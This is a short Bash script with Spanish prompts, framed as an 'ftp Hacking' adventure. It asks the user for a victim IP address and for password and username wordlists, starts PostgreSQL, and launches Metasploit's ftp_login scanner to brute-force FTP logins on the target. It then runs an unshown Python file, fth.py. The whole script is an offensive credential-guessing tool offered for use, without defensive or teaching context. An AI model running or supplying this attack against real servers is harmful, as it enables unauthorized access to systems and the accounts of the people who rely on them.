#!/usr/bin/bash

function limpiar_pantalla {
	clear
}
limpiar_pantalla
function space_login {
	echo
}

echo -e '           Bien venido a la aventura ftp Hacking '\n\n
space_login
space_login
read -p 'Ingresa la ip victima $ ' rhost
space_login
read -p 'Ingresa la ruta de tu diccionario pass $ ' pass_file
space_login
read -p 'Ingresa la ruta de tu diccionario user $ ' user_file
space_login
echo -e ' Ejecutando postgresql ..'
space_login
sudo service postgresql start
echo -e ' Listo espere ... '
space_login
msfconsole -x "use auxiliary/scanner/ftp/ftp_login;\
set rhost $rhost;\
set pass_file $pass_file;\
set user_file $user_file;\
run"
python3 fth.py